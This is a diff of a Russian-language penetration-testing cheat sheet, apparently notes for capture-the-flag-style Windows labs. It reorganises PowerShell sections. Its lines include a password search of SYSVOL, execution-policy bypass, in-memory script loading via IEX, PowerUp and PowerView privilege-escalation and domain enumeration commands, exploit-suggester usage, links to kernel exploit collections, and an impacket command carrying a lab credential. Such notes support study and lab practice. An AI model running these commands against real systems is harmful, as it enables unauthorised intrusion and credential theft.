@@ -211,30 +211,16 @@ findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config
 
 
 
-
-
-Загрузка скриптов без получения разрешения на запуск POwerShell
-IEX (New-Object Net.WebClient).DownloadString("file://$PWD/pw.ps1")
-
-Import-Module - соответственно импорт модуля
-
-Set-ExecutionPolicy Unrestricted  - разрешить выполнение скриптов
-
-https://github.com/HarmJ0y/PowerUp
-
 !!! http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
 
-Проверка мисконфигов виндовс
+# Проверка мисконфигов виндовс
 
 !!! https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 
-https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
-  для которого import-module ./powerup.ps1 и затем Invoke-AllChecks или 
-  Invoke-AllChecks | out-file -Encoding ASCII checks.txt
 
   https://github.com/SecWiki/windows-kernel-exploits все эксплойты!!!
 
-  ## Сканер Эксплойтов виндовс
+  # Сканер Эксплойтов виндовс
 
 ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
 
@@ -263,4 +249,24 @@ impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -method LDAPS -co
 
 # Power Shell
 
-powershell -ep bypass
+powershell -ep bypass (Обход блокировки скриптов)
+
+Import-Module .\PowerView.ps1 (Загрузить модуль в память)
+
+Set-ExecutionPolicy Unrestricted  - разрешить выполнение скриптов
+
+Загрузка скриптов без получения разрешения на запуск POwerShell
+IEX (New-Object Net.WebClient).DownloadString("file://$PWD/pw.ps1")
+
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+  для которого import-module ./powerup.ps1 и затем Invoke-AllChecks или 
+  Invoke-AllChecks | out-file -Encoding ASCII checks.txt
+
+https://github.com/HarmJ0y/PowerUp
+
+--Power view
+
+Get-NetUser | select cn    (список пользователей)
+
+Get-NetGroup -GroupName *admin*   (список групп содержащих *админ*)
+
